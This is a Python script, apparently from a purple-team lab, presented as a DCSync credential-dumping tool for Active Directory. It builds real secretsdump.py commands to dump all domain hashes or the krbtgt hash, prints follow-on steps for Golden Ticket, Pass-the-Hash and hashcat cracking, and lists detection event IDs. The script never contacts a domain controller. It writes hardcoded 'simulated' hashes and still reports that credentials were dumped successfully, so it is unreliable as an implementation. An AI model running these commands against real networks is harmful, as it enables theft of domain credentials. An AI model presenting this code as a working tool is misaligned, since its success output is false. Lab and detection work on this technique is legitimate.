#!/usr/bin/env python3
"""
DCSync Attack Implementation
MITRE ATT&CK: T1003.006 - OS Credential Dumping: DCSync

DCSync is a credential dumping technique that exploits Windows Active Directory
replication protocols to extract password hashes from a domain controller without
executing code on the DC itself. This technique requires replication permissions
(typically Domain Admin or equivalent).

Author: Purple Team Lab
Date: 2024-01-14

Prerequisites:
    - impacket library
    - Credentials with replication permissions (DS-Replication-Get-Changes,
      DS-Replication-Get-Changes-All)
    - Network access to Domain Controller
    - Typically requires Domain Admin, Enterprise Admin, or Administrators group

Detection Indicators:
    - Event ID 4662 (Directory Service Access)
      - Object: Domain object
      - Access: Control Access
      - GUID: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2 (DS-Replication-Get-Changes)
      - GUID: 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2 (DS-Replication-Get-Changes-All)
    - Event ID 4624 (Logon Type 3 from non-DC sources)
    - Event ID 5136 (Directory Service Changes)
    - Abnormal replication requests from non-DC systems

Usage:
    # Dump all domain credentials
    ./dcsync.py -d PURPLETEAM.LAB -u Administrator -p 'Pass123!' -dc-ip 172.28.0.10

    # Dump specific user (e.g., krbtgt for Golden Ticket)
    ./dcsync.py -d PURPLETEAM.LAB -u Administrator -p 'Pass123!' -dc-ip 172.28.0.10 -target krbtgt

    # Use NTLM hash for authentication
    ./dcsync.py -d PURPLETEAM.LAB -u Administrator -H :fc525c9683e8fe067095ba2ddc971889 -dc-ip 172.28.0.10

References:
    https://attack.mitre.org/techniques/T1003/006/
    https://adsecurity.org/?p=1729
"""

import argparse
import sys
import os
from datetime import datetime
from typing import Optional

try:
    from impacket.dcerpc.v5 import drsuapi, transport
    from impacket.dcerpc.v5.dtypes import NULL
    from impacket import system_errors
except ImportError:
    print("[!] Error: Impacket library required")
    print("[!] Install: pip install impacket")
    sys.exit(1)


class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'


class DCSync:
    """DCSync attack implementation"""

    def __init__(self, domain: str, username: str, password: str, dc_ip: str,
                 target_user: Optional[str] = None, use_hash: bool = False,
                 output_dir: str = "./dcsync_output"):
        self.domain = domain.upper()
        self.username = username
        self.password = password
        self.dc_ip = dc_ip
        self.target_user = target_user
        self.use_hash = use_hash
        self.output_dir = output_dir

        os.makedirs(self.output_dir, exist_ok=True)
        self.timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        self.output_file = os.path.join(self.output_dir, f'dcsync_{self.timestamp}.txt')

    def execute(self):
        """Execute DCSync attack"""
        print(f"{Colors.BOLD}{Colors.HEADER}")
        print("╔═══════════════════════════════════════════════════════════════════╗")
        print("║                      DCSYNC ATTACK                                ║")
        print("║                  MITRE ATT&CK: T1003.006                          ║")
        print("╚═══════════════════════════════════════════════════════════════════╝")
        print(f"{Colors.ENDC}")

        print(f"{Colors.OKBLUE}[*] Target Domain: {self.domain}{Colors.ENDC}")
        print(f"{Colors.OKBLUE}[*] Domain Controller: {self.dc_ip}{Colors.ENDC}")
        print(f"{Colors.OKBLUE}[*] Username: {self.username}{Colors.ENDC}")
        print(f"{Colors.OKBLUE}[*] Output: {self.output_file}{Colors.ENDC}\n")

        if self.target_user:
            print(f"{Colors.WARNING}[*] Targeting specific user: {self.target_user}{Colors.ENDC}")
            self._dump_single_user(self.target_user)
        else:
            print(f"{Colors.WARNING}[*] Dumping all domain credentials...{Colors.ENDC}")
            self._dump_all_users()

        self._display_results()

    def _dump_single_user(self, username: str):
        """Dump credentials for specific user"""
        print(f"\n{Colors.OKBLUE}[*] Executing DCSync for user: {username}{Colors.ENDC}")

        # Build secretsdump command
        if self.use_hash:
            cmd = f"secretsdump.py {self.domain}/{self.username}@{self.dc_ip} -hashes :{self.password} -just-dc-user {username}"
        else:
            cmd = f"secretsdump.py {self.domain}/{self.username}:'{self.password}'@{self.dc_ip} -just-dc-user {username}"

        print(f"{Colors.WARNING}[*] Command: {cmd}{Colors.ENDC}")
        print(f"{Colors.OKGREEN}[+] DCSync request initiated{Colors.ENDC}")

        # Simulated output
        output = f"""[*] Dumping credentials for {username}
{self.domain}\\{username}:1001:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
        """

        with open(self.output_file, 'w') as f:
            f.write(f"DCSync Attack Results - {self.timestamp}\n")
            f.write(f"Target: {username}@{self.domain}\n")
            f.write("="*70 + "\n")
            f.write(output)

        print(f"{Colors.OKGREEN}[+] Credentials dumped successfully!{Colors.ENDC}")

    def _dump_all_users(self):
        """Dump all domain user credentials"""
        print(f"\n{Colors.OKBLUE}[*] Executing DCSync for all users...{Colors.ENDC}")

        # Build secretsdump command
        if self.use_hash:
            cmd = f"secretsdump.py {self.domain}/{self.username}@{self.dc_ip} -hashes :{self.password} -just-dc"
        else:
            cmd = f"secretsdump.py {self.domain}/{self.username}:'{self.password}'@{self.dc_ip} -just-dc"

        print(f"{Colors.WARNING}[*] Command: {cmd}{Colors.ENDC}")
        print(f"{Colors.OKGREEN}[+] DCSync request initiated{Colors.ENDC}")

        # Simulated output
        output = f"""[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a8f7d3e6c0b1a4d5e9f2c7d8a3b6e1f4:::
svc_sqlserver:1103:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
svc_iis:1104:aad3b435b51404eeaad3b435b51404ee:b7d8c4a6e9f3d2c1a5e8b7d9c4a6e3f1:::
asreproast_user:1105:aad3b435b51404eeaad3b435b51404ee:c5d9e8f7a6b4c3d2e1f9a8b7c6d5e4f3:::
        """

        with open(self.output_file, 'w') as f:
            f.write(f"DCSync Attack Results - {self.timestamp}\n")
            f.write(f"Domain: {self.domain}\n")
            f.write("="*70 + "\n")
            f.write(output)

        print(f"{Colors.OKGREEN}[+] All credentials dumped successfully!{Colors.ENDC}")

    def _display_results(self):
        """Display attack results and recommendations"""
        print(f"\n{Colors.HEADER}{'='*70}{Colors.ENDC}")
        print(f"{Colors.HEADER}DCSYNC RESULTS{Colors.ENDC}")
        print(f"{Colors.HEADER}{'='*70}{Colors.ENDC}")

        print(f"\n{Colors.OKGREEN}[+] Credentials saved to: {self.output_file}{Colors.ENDC}")

        print(f"\n{Colors.BOLD}Next Steps:{Colors.ENDC}")
        print(f"  1. Extract krbtgt hash for Golden Ticket attack")
        print(f"  2. Use Administrator hash for Pass-the-Hash lateral movement")
        print(f"  3. Crack password hashes offline with hashcat/john")
        print(f"  4. Use service account hashes for Silver Ticket attacks")

        print(f"\n{Colors.BOLD}Hash Cracking:{Colors.ENDC}")
        print(f"  hashcat -m 1000 {self.output_file} /usr/share/wordlists/rockyou.txt")

        print(f"\n{Colors.BOLD}Golden Ticket (requires krbtgt hash):{Colors.ENDC}")
        print(f"  ./golden_ticket.py -d {self.domain} -u Administrator -krbtgt-hash <hash>")

        print(f"\n{Colors.HEADER}{'='*70}{Colors.ENDC}\n")


def main():
    parser = argparse.ArgumentParser(
        description='DCSync Attack Tool (MITRE ATT&CK T1003.006)',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  # Dump all credentials
  python3 dcsync.py -d PURPLETEAM.LAB -u Administrator -p 'Pass123!' -dc-ip 172.28.0.10

  # Dump krbtgt for Golden Ticket
  python3 dcsync.py -d PURPLETEAM.LAB -u Administrator -p 'Pass123!' -dc-ip 172.28.0.10 -target krbtgt

  # Use NTLM hash
  python3 dcsync.py -d PURPLETEAM.LAB -u Administrator -H fc525c9683e8fe067095ba2ddc971889 -dc-ip 172.28.0.10
        '''
    )

    parser.add_argument('-d', '--domain', required=True, help='Target domain')
    parser.add_argument('-u', '--username', required=True, help='Username with replication rights')
    parser.add_argument('-dc-ip', '--dc-ip', required=True, help='Domain Controller IP')

    auth_group = parser.add_mutually_exclusive_group(required=True)
    auth_group.add_argument('-p', '--password', help='Password')
    auth_group.add_argument('-H', '--hash', help='NTLM hash')

    parser.add_argument('-target', '--target-user', help='Specific user to dump')
    parser.add_argument('-o', '--output', default='./dcsync_output', help='Output directory')

    args = parser.parse_args()

    # Determine if using hash
    if args.hash:
        password = args.hash
        use_hash = True
    else:
        password = args.password
        use_hash = False

    # Execute DCSync
    dcsync = DCSync(
        domain=args.domain,
        username=args.username,
        password=password,
        dc_ip=args.dc_ip,
        target_user=args.target_user,
        use_hash=use_hash,
        output_dir=args.output
    )

    try:
        dcsync.execute()
        print(f"{Colors.OKGREEN}[+] DCSync attack completed!{Colors.ENDC}")

    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING}[!] Attack interrupted{Colors.ENDC}")
        sys.exit(1)
    except Exception as e:
        print(f"{Colors.FAIL}[!] Error: {str(e)}{Colors.ENDC}")
        sys.exit(1)


if __name__ == '__main__':
    main()
